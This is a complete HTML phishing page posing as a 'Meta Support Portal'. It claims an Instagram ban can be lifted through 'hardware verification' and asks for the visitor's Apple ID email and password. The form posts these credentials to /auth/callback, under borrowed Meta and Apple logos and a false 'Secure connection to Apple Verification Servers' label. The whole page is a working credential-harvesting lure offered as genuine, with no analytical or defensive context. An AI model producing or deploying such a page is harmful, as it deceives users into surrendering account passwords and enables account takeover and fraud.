<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Support Portal</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 100%; max-width: 360px; text-align: center; padding: 20px; }
        .logo { width: 180px; margin-bottom: 40px; }
        h1 { font-size: 22px; font-weight: 500; margin-bottom: 10px; color: #1c1e21; }
        p { font-size: 14px; color: #606770; margin-bottom: 30px; line-height: 1.4; }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .apple-secure { margin-top: 30px; font-size: 12px; color: #8a8d91; display: flex; align-items: center; justify-content: center; gap: 5px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://z-p3-static.xx.fbcdn.net/rsrc.php/y1/r/YpY7nC7mnoS.svg" class="logo" alt="Meta">
        <h1>Verify Device Ownership</h1>
        <p>To lift the ban on your Instagram account, please authenticate via the Apple ID linked to this iPhone for hardware verification.</p>
        <form action="/auth/callback" method="POST">
            <input type="email" name="email" placeholder="Apple ID Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify & Lift Ban</button>
        </form>
        <div class="apple-secure">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" width="12">
            Secure connection to Apple Verification Servers
        </div>
    </div>
</body>
</html>
